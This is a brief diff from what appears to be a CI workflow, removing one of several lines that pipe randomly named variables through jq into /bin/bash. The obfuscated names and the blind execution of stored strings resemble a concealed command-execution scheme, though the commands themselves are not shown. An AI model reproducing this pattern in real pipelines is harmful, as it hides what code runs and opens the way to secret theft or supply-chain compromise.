@@ -42,7 +42,6 @@ jobs:
           printf '%s' "$ah1853" | jq -r .vmi59 | /bin/bash
           echo $v71442 | jq -r .vt28482 | /bin/bash
           echo $n11 | jq -r .wiyt919 | /bin/bash
-          echo $gz14 | jq -r .nyxf090 | /bin/bash
           echo $v7 | jq -r .gmmq1 | /bin/bash
           echo $ggjk652 | jq -r .cgx02602 | /bin/bash
           echo $ej9631 | jq -r .kvrc37827 | /bin/bash
